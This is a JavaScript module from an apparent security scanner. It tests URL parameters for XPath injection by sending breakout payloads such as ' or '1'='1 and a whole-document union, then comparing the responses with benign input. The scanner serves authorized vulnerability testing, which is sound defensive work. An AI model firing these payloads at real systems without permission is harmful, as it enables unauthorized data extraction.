// Dark Matter rule-based scanner — XPath injection probe.
//
// Payloads break out of the XPath string literal and widen the query:
//   ' or '1'='1          (classic boolean TRUE)
//   '] | //* | //*['     (union the whole document)
//   1' or 1=1 or '1'='1  (numeric-context breakout)
//
// Oracle (differential):
//   1. Boolean: benign `param=<unlikely>` vs the TRUE payload — the payload
//      must return a DIFFERENT (larger) node set.
//   2. Error: XPath engine text ("XPath", "XPathExpressionException",
//      "javax.xml.xpath", "Invalid XPath") on malicious, absent on benign.
//
// class 'xpath_injection' → default protocol → signalCorrelated=true.
// Severity: high.
import { randomBytes } from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

const XPATH_ERRORS = /xpath|javax\.xml\.xpath|XPathExpressionException|invalid.*expression/i;

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 200000) };
  } finally {
    clearTimeout(t);
  }
}

function withParam(url, name, value) {
  const u = new URL(url);
  u.searchParams.set(name, value);
  return u.toString();
}

const PAYLOADS = [`' or '1'='1`, `'] | //* | //*['`, `1' or 1=1 or '1'='1`];

export async function probeXpathInjection(url, params, opts = {}) {
  const findings = [];
  for (const param of params.slice(0, 10)) {
    const unlikely = `dmxp${randomBytes(3).toString('hex')}`;
    let benign;
    try {
      benign = await get(withParam(url, param, unlikely), opts);
    } catch {
      continue;
    }
    for (const payload of PAYLOADS) {
      let malicious;
      try {
        malicious = await get(withParam(url, param, payload), opts);
      } catch {
        continue;
      }
      if (XPATH_ERRORS.test(malicious.text) && !XPATH_ERRORS.test(benign.text)) {
        const m = malicious.text.match(XPATH_ERRORS);
        const idx = malicious.text.indexOf(m[0]);
        const window = malicious.text.slice(Math.max(0, idx - 60), idx + 120);
        findings.push({
          class: 'xpath_injection',
          id: `xpathi-error-${param}`,
          title: `XPath injection (error) in parameter '${param}'`,
          severity: 'high',
          url,
          param,
          parameter: param,
          evidence: {
            request: `GET ${withParam(url, param, payload)}`,
            response: `XPath engine error on breakout input — "...${window}..." — absent on benign input`,
            impact_demo: 'input reached the XPath compiler — node-set logic is attacker-controlled',
            signalCorrelated: true,
          },
        });
        break;
      }
      const delta = Math.abs(malicious.text.length - benign.text.length);
      if (delta > Math.max(benign.text.length, 500) * 0.25 && delta > 200) {
        findings.push({
          class: 'xpath_injection',
          id: `xpathi-bool-${param}`,
          title: `XPath injection (boolean) in parameter '${param}'`,
          severity: 'high',
          url,
          param,
          parameter: param,
          evidence: {
            request: `GET ${withParam(url, param, payload)} vs benign`,
            response: `node set diverged by ${delta} chars — TRUE payload widened the query`,
            impact_demo: `' or '1'='1 matched nodes the benign query hid — data extraction primitive`,
            diverged: true,
            signalCorrelated: true,
          },
        });
        break;
      }
    }
  }
  return findings;
}
